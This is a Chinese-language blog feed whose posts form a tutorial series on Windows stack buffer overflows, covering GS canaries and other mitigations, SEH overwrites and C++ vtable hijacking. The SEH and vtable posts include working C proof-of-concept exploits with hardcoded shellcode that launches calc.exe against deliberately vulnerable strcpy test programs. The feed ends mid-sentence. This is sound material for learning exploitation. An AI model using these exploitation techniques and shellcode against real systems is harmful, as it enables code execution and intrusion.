<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hello! CytQ</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://imlzq.com/"/>
  <updated>2018-08-27T12:44:01.600Z</updated>
  <id>http://imlzq.com/</id>
  
  <author>
    <name>CytQ</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>通关栈溢出（四）：缓冲区溢出的防御技术及绕过</title>
    <link href="http://imlzq.com/2018/08/11/stackoverflow_protection/"/>
    <id>http://imlzq.com/2018/08/11/stackoverflow_protection/</id>
    <published>2018-08-10T16:00:00.000Z</published>
    <updated>2018-08-27T12:44:01.600Z</updated>
    
    <content type="html"><![CDATA[<p>前面几篇介绍了如何利用栈溢出，本文就介绍一下windows现有的缓冲区溢出缓解技术以及他们的绕过方案。</p><p>包括ASLR、SafeSEH、SEHOP、DEP、GS</p><p>其实看完本文就能发现，攻与防都是相对的，这上面的5种防御全是基于现有的栈溢出攻击手段来做的，而攻击者又针对这5种防御手段做出新的攻击策略。这个就是我认为安全攻防有意思的点</p><p>OS： Windows XP SP2, Window 7，Windows 2000</p><p>Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0</p><a id="more"></a>   <h2 id="一、GS"><a href="#一、GS" class="headerlink" title="一、GS"></a>一、GS</h2><table><thead><tr><th>栈布局</th></tr></thead><tbody><tr><td>局部变量</td></tr><tr><td>security_cookie</td></tr><tr><td>入栈寄存器</td></tr><tr><td>SEH节点</td></tr><tr><td>返回地址</td></tr><tr><td>函数参数</td></tr><tr><td>虚函数表</td></tr></tbody></table><p>先把这个展示了很久的栈布局再贴出来一次。</p><p>我们在<a href="http://imlzq.com/2018/08/07/stackOverFlow_1/">通关栈溢出（一）：原理及初级攻击</a>这篇文章中，介绍了用覆盖函数返回地址的方法执行我们的Shellcode，但如果操作系统在函数调用前就在返回值前方插入一个security_cookie，每次return时校验这个security_cookie是否有改动不就可以完美的判断当前的栈是否发生了缓冲区溢出了吗？</p><p>这就是GS所做的任务。GS插入的这个security_cookie也被称为Canary（小趣闻：以前矿工工作时，会先放只鸟下去看看氧气含量是否达标，以此检测是否安全）。</p><p><strong>它的执行逻辑为：</strong></p><ol><li>系统在.data的内存区域种存放一个SecurityCookie的副本。程序每次运行时会以.data的第一个双字作为Cookie的种子，或者原始Cookie。因此程序每次运行所产生的Cookie种子就有区别。</li><li>在所有的函数调用发生时，向栈帧中压入一个额外的随机DWORD。排列顺序如上表，它位于EBP和返回地址之前。当栈帧初始化以后系统用ESP异或Cookie种子，作为这里的DWORD，也就是当前函数的Cookie，以此作为不同函数之间的区别。</li><li>在函数返回前，系统将执行一个额外的安全验证操作SecurityCheck，先用ESP还原出（异或）Cookie的种子，匹配该种子和.data区域的数值是否一样。</li><li>如果不一样，<strong>进行异常处理流程</strong>，函数不会正常返回，ret指令也不会被执行。</li></ol><p><strong>例外：</strong></p><p>从上面的执行逻辑我们能发现一点，就是GS一定对程序的效率有影响，因为它给所有函数都加上这个校验，那就意味着每次都会多一个check.</p><p>如果现在有个函数，它的唯一功能是index += 1。在外部我们用for循环反复调用10000次，那这里的性能损耗是能直接看出来的：执行Security校验的总时间加起来比函数本身的消耗还长。对于一个操作系统来讲，这是很差劲的一件事情。因此GS是允许存在例外的，在这些例外中，函数不会被插入canary。</p><blockquote><ol><li>函数不包含缓冲区</li><li>函数被定义为具有变量参数列表</li><li>函数使用无保护的关键字标记</li><li>函数在第一个语句中包含内嵌汇编代码</li><li>缓冲区不是8字节类型且大小不大于4个字节</li></ol></blockquote><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>单从上面这几点，我们不难看出，GS有几项很明显的攻击面：</p><ul><li>SecurityCheck失败后，程序会进入异常处理流程，也就是SEH。  这里是不是很熟悉？</li><li>GS为了性能，允许存在例外，那这些例外我们可以利用吗？</li><li>SecurityCheck是和.data中存放的canary副本做匹配，那如果攻击者把.data内存放的canary副本都改了呢？</li></ul><h3 id="攻击1：利用未保护的内存突破GS"><a href="#攻击1：利用未保护的内存突破GS" class="headerlink" title="攻击1：利用未保护的内存突破GS"></a>攻击1：利用未保护的内存突破GS</h3><h3 id="攻击2：攻击虚函数"><a href="#攻击2：攻击虚函数" class="headerlink" title="攻击2：攻击虚函数"></a>攻击2：攻击虚函数</h3><h3 id="攻击3：-攻击SEH"><a href="#攻击3：-攻击SEH" class="headerlink" title="攻击3： 攻击SEH"></a>攻击3： 攻击SEH</h3><h3 id="攻击4：同时替换栈中和-data中的Cookie"><a href="#攻击4：同时替换栈中和-data中的Cookie" class="headerlink" title="攻击4：同时替换栈中和.data中的Cookie"></a>攻击4：同时替换栈中和.data中的Cookie</h3><h2 id="二、SafeSEH"><a href="#二、SafeSEH" class="headerlink" title="二、SafeSEH"></a>二、SafeSEH</h2><h2 id="三、DEP"><a href="#三、DEP" class="headerlink" title="三、DEP"></a>三、DEP</h2><h2 id="四、ASLR"><a href="#四、ASLR" class="headerlink" title="四、ASLR"></a>四、ASLR</h2><h2 id="五、SEHOP"><a href="#五、SEHOP" class="headerlink" title="五、SEHOP"></a>五、SEHOP</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前面几篇介绍了如何利用栈溢出，本文就介绍一下windows现有的缓冲区溢出缓解技术以及他们的绕过方案。&lt;/p&gt;
&lt;p&gt;包括ASLR、SafeSEH、SEHOP、DEP、GS&lt;/p&gt;
&lt;p&gt;其实看完本文就能发现，攻与防都是相对的，这上面的5种防御全是基于现有的栈溢出攻击手段来做的，而攻击者又针对这5种防御手段做出新的攻击策略。这个就是我认为安全攻防有意思的点&lt;/p&gt;
&lt;p&gt;OS： Windows XP SP2, Window 7，Windows 2000&lt;/p&gt;
&lt;p&gt;Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="通关" scheme="http://imlzq.com/tags/%E9%80%9A%E5%85%B3/"/>
    
      <category term="专栏" scheme="http://imlzq.com/tags/%E4%B8%93%E6%A0%8F/"/>
    
  </entry>
  
  <entry>
    <title>通关栈溢出（三）：攻击SEH</title>
    <link href="http://imlzq.com/2018/08/10/stackoverflow_seh/"/>
    <id>http://imlzq.com/2018/08/10/stackoverflow_seh/</id>
    <published>2018-08-09T16:00:00.000Z</published>
    <updated>2018-08-27T12:04:17.304Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍利用SEH来实现栈溢出</p><p>OS： Windows XP SP2, Window 7，Windows 2000</p><p>Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0</p><a id="more"></a>    <h2 id="S-E-H"><a href="#S-E-H" class="headerlink" title="S.E.H"></a>S.E.H</h2><blockquote><p>Structture Exception Handler: 异常处理结构体。它是windows异常处理机制所采用的重要数据结构。</p><p>每个S.E.H包含两个DWORD指针：SEH链表指针和异常处理函数句柄，共8个字节。</p></blockquote><p><strong>简单点就是，多个SEH是用链表串起来的，因此每个SEH都包含当前的Exception handler和一个next指针</strong></p><ol><li>SEH结构体存放在系统栈中</li><li>当线程初始化时，会自动向栈中安装一个SEH作为线程默认的异常处理</li><li>如果程序员代码中使用了__try{}__except{}或者Assert宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个SEH来实现异常处理</li><li>栈中一般同时会存在多个SEH</li><li>栈中的多个SEH通过链表指针在栈内由栈顶向栈底串成单项链表，位于链表最顶端的SEH通过TEB（线程环境块）0字节偏移处的指针标识</li><li>当异常发生时，操作系统会中断程序，并首先从TEB的0字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。</li><li>当离“事故现场”最近的异常处理函数运行失败时，将顺着SEH链依次尝试其他的异常处理函数</li><li>如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框然后强制关闭程序。</li></ol><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>从上面的定义我们不难看出，SEH是存放在栈里的。这也就说明，如果发生栈溢出，那么溢出的代码是可以覆盖掉SEH的入口地址的。而此时只要我们再手动触发一下目标异常，就能跳转到Shellcode了</p><p>下图是函数调用时栈内的情况，如果在程序中设置了try-except，那么SEH节点会更多</p><table><thead><tr><th>栈布局</th></tr></thead><tbody><tr><td>局部变量</td></tr><tr><td>security_cookie ：      gs校验码，操作系统用于检测是否有溢出，需要操作系统支持且编译时开启</td></tr><tr><td>入栈寄存器</td></tr><tr><td>SEH节点</td></tr><tr><td>返回地址</td></tr><tr><td>函数参数</td></tr><tr><td>虚函数表</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">""</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HackExceptionHandler</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"got an exception, press Enter to kill process\n"</span>);</span><br><span class="line">getchar();</span><br><span class="line">ExitProcess(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">char</span>* input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="keyword">int</span> zero = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(buf, input);</span><br><span class="line">zero = <span class="number">4</span> / zero;</span><br><span class="line">&#125;</span><br><span class="line">__except(HackExceptionHandler())</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test(shellcode);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拖入ollydbg动态调试，选择View下的SEH chain选项，就能看到当前栈中的SEH表的情况。</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_seh2.png" alt="seh chain"></p><p>从图中能看出，0012FF18是离栈顶最近的SEH。</p><p>接着我们在调试的栈窗口看到的数据也能验证我们的想法：</p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_seh3.png" alt="seh stack"></p><p>地址0012ff1c的位置已经被OD自动标记为了SEhandler，address-4就是它的next指针所处的位置，与SEH chain中看到的数据一样。</p><p>另外，从上图的stack布局能看出来，buf的起始地址为12FF40，最终地址为0012FF0C，局部变量zero的位置是12FF10，只要我们能够覆盖buf到12FF18，让它指向shellcode，那么在发生异常时，就会执行到恶意代码。</p><p>因此，构造shellcode如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] = </span><br><span class="line">    <span class="comment">// 下面是弹出计算器的shellcode</span></span><br><span class="line"> <span class="string">"\x83\xEC\x40\x33\xDB\x53\x68\x2E\x65\x78\x65"</span></span><br><span class="line"> <span class="string">"\x68\x63\x61\x6C\x63\x8B\xC4\x53\x50\xB9\x4D"</span></span><br><span class="line"> <span class="string">"\x11\x86\x7C\x8B\xC1\xFF\xD0\x33\xDB\x53\xB8"</span></span><br><span class="line"> <span class="string">"\xA2\xCA\x81\x7C\x8B\xC0\xFF\xD0"</span></span><br><span class="line"> <span class="string">"\x90....."</span><span class="comment">//使用90填充剩下的空间</span></span><br><span class="line"> <span class="string">"\x40\xFF\x12\x00"</span> <span class="comment">// 指向buf的起始地址，这一行会覆盖掉SEH的next指针</span></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上就是SEH的攻击方法，因为SEH本身就放在栈中，那么发生缓冲区溢出时攻击者是一定能控制SEH的next的，这也让SEH的攻击成为了栈溢出的一种经典方法。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍利用SEH来实现栈溢出&lt;/p&gt;
&lt;p&gt;OS： Windows XP SP2, Window 7，Windows 2000&lt;/p&gt;
&lt;p&gt;Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="通关" scheme="http://imlzq.com/tags/%E9%80%9A%E5%85%B3/"/>
    
      <category term="专栏" scheme="http://imlzq.com/tags/%E4%B8%93%E6%A0%8F/"/>
    
  </entry>
  
  <entry>
    <title>通关栈溢出（二）：攻击C++的虚函数</title>
    <link href="http://imlzq.com/2018/08/09/stackoverflow_virtualmethod/"/>
    <id>http://imlzq.com/2018/08/09/stackoverflow_virtualmethod/</id>
    <published>2018-08-09T13:42:00.000Z</published>
    <updated>2018-08-27T12:15:00.096Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要介绍利用C++的虚函数来实现栈溢出漏洞利用</p><p>OS： Windows XP SP2, Window 7</p><p>Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0</p><a id="more"></a>    <h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><p>说白了就是多态，跟Java中抽象接口是一个概念，只是表现形式会略有区别。</p><p><strong>定义：</strong></p><ol><li>C++的成员函数在声明时，若使用virtual修饰，就是虚函数</li><li>一个类中可能有多个虚函数</li><li>虚函数的入口地址被统一保存在虚表（Vtable）中</li><li>对象在使用虚函数时，先通过虚表指针找到虚表，然后从虚表中取出最终的函数入口地址进行调用</li><li>虚表指针保存在对象的内存空间中，紧接着虚表指针的是其他成员变量</li></ol><p>E.G：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TmpClass</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        count &lt;&lt; <span class="string">"Hello virtual"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>Object</th><th>虚表Vtable</th><th>虚函数 virtual function</th></tr></thead><tbody><tr><td>虚表指针 -》point to virtual function2</td><td>virtual function1</td><td>function impl 1</td></tr><tr><td>其他成员变量</td><td>virtual function2</td><td>function impl 2</td></tr></tbody></table><p>如上，TmpClass中有个虚函数test()，因此在栈中它的布局就是，一个指向vtable的虚表指针以及其他成员变量。</p><p>当程序运行时，如果要调用这个test方法，那么就会到栈中找到虚表指针，然后从虚表中匹配这个虚表指针从而定位它的函数实现。</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>从上文可以看出，如果对象中的成员变量发生了溢出，那么只要我们能够修改对象的虚表指针或者虚表中的虚函数实现指针，就能让程序定向执行我们的shellcode。</p><table><thead><tr><th>栈布局</th></tr></thead><tbody><tr><td>局部变量</td></tr><tr><td>security_cookie ：      gs校验码，操作系统用于检测是否有溢出，需要操作系统支持且编译时开启</td></tr><tr><td>入栈寄存器</td></tr><tr><td>SEH节点</td></tr><tr><td>返回地址</td></tr><tr><td>函数参数</td></tr><tr><td>虚函数表</td></tr></tbody></table><p>这上面是函数调用时栈内的布局情况，从下到上为高地址到低地址。</p><p>从虚函数的执行逻辑来说，会有两个地址的跳转。</p><ol><li>从虚表指针跳转到虚表</li><li>从虚表跳转到虚函数</li></ol><p>因此，如果我们要实行攻击，那么只需要使用自定义的两段地址覆盖掉原始地址即可，其中的一个地址A是指向shellcode的首部或者末尾，这里也是地址B。地址B再指向Shellcode的真正执行代码</p><p><strong>攻击代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> shellcode[] = </span><br><span class="line"><span class="string">"\x64\xD8\x42\x00"</span>  <span class="comment">// 地址B，目前放于Shellcode首部，用于跳转到shellcode的真正起始地址。在这里是当前位置+4。</span></span><br><span class="line"> <span class="comment">// 注意，这里的地址B是附带\x00截断符的，对攻击有影响，具体的看文末的TIP模块</span></span><br><span class="line"> <span class="comment">// 建议将地址B放在Shellcode的末尾</span></span><br><span class="line"><span class="string">"\x83\xEC\x50\x33\xDB\x53\x68\x6C\x6C\x20\x20\x68\x33\x32\x2E\x64\x68"</span></span><br><span class="line"><span class="string">"\x75\x73\x65\x72\x8B\xDC\x53\xB8\x77\x1D\x80\x7C\x8B\xC0\xFF\xD0\x33"</span></span><br><span class="line"><span class="string">"\xDB\x53"</span></span><br><span class="line"><span class="string">"\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63"</span></span><br><span class="line"><span class="string">"\x8B\xC4\x53\x50\xB9"</span></span><br><span class="line"><span class="string">"\x4D\x11\x86\x7C\xFF\xD1\x33\xDB\x53\xB8\xA2\xCA\x81\x7C\xFF\xD0"</span></span><br><span class="line"><span class="string">"\x90\x90\x90\x90"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"hello world"</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">HelloWorld overflow, *p;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span>* p_vtable;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p\n"</span>, overflow.buf); <span class="comment">// 获取类中buf[200]的实际地址，虚表指针的地址为buf-4</span></span><br><span class="line">p_vtable = overflow.buf - <span class="number">4</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%p\n"</span>, shellcode);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> x = <span class="number">0x42E1CC</span>;          </span><br><span class="line"><span class="keyword">int</span> lx = x &amp; <span class="number">0xFF</span>;    </span><br><span class="line"><span class="keyword">int</span> mx = x &gt;&gt; <span class="number">8</span>&amp;<span class="number">0xFF</span>;    </span><br><span class="line"><span class="keyword">int</span> hx = x &gt;&gt; <span class="number">16</span>&amp;<span class="number">0xFF</span>;</span><br><span class="line"><span class="keyword">int</span> first02 = x &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, lx);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, mx);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, hx);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%x\n"</span>, first02);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在获取到虚表指针在内存中的实际地址后,我们需要将它指向的内容改为地址B</span></span><br><span class="line">    <span class="comment">// 这样就能跳转到Shellcode的首部从而执行二次跳转</span></span><br><span class="line">p_vtable[<span class="number">0</span>] = lx;</span><br><span class="line">p_vtable[<span class="number">1</span>] = mx;</span><br><span class="line">p_vtable[<span class="number">2</span>] = hx;</span><br><span class="line">p_vtable[<span class="number">3</span>] = first02;</span><br><span class="line"><span class="built_in">strcpy</span>(overflow.buf, shellcode);</span><br><span class="line"></span><br><span class="line">p = &amp;overflow;</span><br><span class="line">p-&gt;test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行结果如下：</strong></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/StackOverFlow/stackoverflow_virtualmethod.png" alt="virtual"></p><p>可以看到这里就已成功弹出计算器了。</p><p>测试代码的Shellcode起始位置是\x83\xEC\x50\x33。\x64\xD8\x42\x00（也就是地址B）指向\x83\xEC\x50\x33</p><p>在《0day安全》的书籍中，它把地址B放在Shellcode的末尾，只不过那样的话地址B指向的地址就应该是 addressB - sizeof(shellcode).</p><p><strong>TIP:</strong></p><p>本文的地址B，是附带00的，也就是说在使用strcpy时复制到00就会截断，而之后到的跳转地址其实是Shellcode在内存中的地址<strong>（Shellcode并没有覆盖缓冲区）</strong>，也就是说，如果本文的input是个txt文件，那么本次的攻击就会失败。因为读到00时就已中断了，后面的shellcode根本就没有读入到内存，也就无法跳转。</p><p>在本文的示例中，之所以能成功，是因为shellcode是代码的一个局部变量，程序创建时它就已经在内存中了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要介绍利用C++的虚函数来实现栈溢出漏洞利用&lt;/p&gt;
&lt;p&gt;OS： Windows XP SP2, Window 7&lt;/p&gt;
&lt;p&gt;Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="通关" scheme="http://imlzq.com/tags/%E9%80%9A%E5%85%B3/"/>
    
      <category term="专栏" scheme="http://imlzq.com/tags/%E4%B8%93%E6%A0%8F/"/>
    
  </entry>
  
  <entry>
    <title>通关栈溢出（一）：原理及初级攻击</title>
    <link href="http://imlzq.com/2018/08/07/stackOverFlow_1/"/>
    <id>http://imlzq.com/2018/08/07/stackOverFlow_1/</id>
    <published>2018-08-07T14:13:00.000Z</published>
    <updated>2018-08-23T12:58:17.254Z</updated>
    
    <content type="html"><![CDATA[<p><strong>前段时间停博了，因为工作的问题不太方便将一些工作内容以博客的方式展现出来，现在开始打算用提取知识点的方式记录下这些经验。太久不写博客还是不太行</strong></p><p>之前写过几篇栈溢出的文章，内容不太全面，零零散散，因此从本文开始打算做个栈溢出的专栏，主要介绍栈溢出相关的问题，包括初级的攻击、jmp esp，SEH、DEP、ALSR、ROP等，算是一篇通关文吧。</p><p>OS： Windows XP SP2, Window 7</p><p>Tools：Ollydbg、IDA pro、AsmToE(汇编转机器码)、010Editor、VC6.0、Xcode、Windbg、VS7.0</p><p>Book: 《0day安全：软件漏洞分析技术》</p><p>知识点的主要来源是”0day安全：软件漏洞分析技术”和网络，但发现它内部80%漏洞利用代码均无法直接在自己的机器上运行。因此本通关专栏不会完全按书的内容规划，在必要的时候会自行实现</p><a id="more"></a>    <h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>每个进程都有一个独立的虚拟地址空间，这些虚拟地址空间在x86里被称为segment，例如Data Segment、Text Segment、stack、heap等等。</p><blockquote><p>Android中，进程里的虚拟地址空间是由vm_area_struct结构组成的。全局维护一个vm_area_struct链表，用于串联所有已分配的空间。当使用mmap申请一个内存空间时，就会找到进程中一块连续且符合大小的区域，创建一个vm_area_struct结构用于标识本区域块，然后将其链接到进程的vm_area_struct链表中。</p></blockquote><p>栈向上增长，底部为高字节，上部为底字节。</p><h2 id="函数调用的汇编过程"><a href="#函数调用的汇编过程" class="headerlink" title="函数调用的汇编过程"></a>函数调用的汇编过程</h2><blockquote><p>需要用到的关键词：</p><p>EBP: 栈底指针</p><p>ESP: 栈顶指针</p><p>EIP：寄存器存放下一个CPU指令存放的内存地址，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行</p></blockquote><p><strong>目标函数：</strong>  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> name[] = <span class="string">"1234567"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>将目标函数需要的参数从右到左依次入栈。PUSH c, PUSH  b, PUSH a</li><li>将函数的返回地址入栈，也就是执行完这个函数后应该执行的下一条指令的地址。</li><li>跳转到目标代码块。2和3合为CALL指令。CALL address of func</li><li>调用方的栈顶属于被调用方的栈底，因此保存该信息，便于接下来分配新的栈帧供func使用。 MOV  ebp, esp,    PUSH ebp</li><li>抬高栈帧.  SUB esp, 0x40.    这也就是给函数分配内存空间，0x40是根据目标函数func的局部变量确定的（程序在链接-编译-汇编的过程中就已生成了size，解析值即可），这里只是示例。</li><li>创建局部变量，4个字节为一组。buf[8]因此会被分为两部分： buf[4~7], buf[0~3]</li><li>do something</li><li>程序执行完毕，还原调用环境，也就是各寄存器的值。降低esp，也就是释放之前分配的栈帧资源。 add esp, 0x40</li><li>程序的最后一行，是RETN，也就是返回。从CPU从EIP中取出下一条指令的内存地址然后执行，这样就完成了函数调用的回溯</li></ol><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><p>在上面的1~6步完成后，栈的结构应该是这样的。</p><p><strong>高地址在下，低地址在上</strong></p><table><thead><tr><th>buf[0~3]</th></tr></thead><tbody><tr><td>buf[4~7]</td></tr><tr><td>ebp</td></tr><tr><td>Return 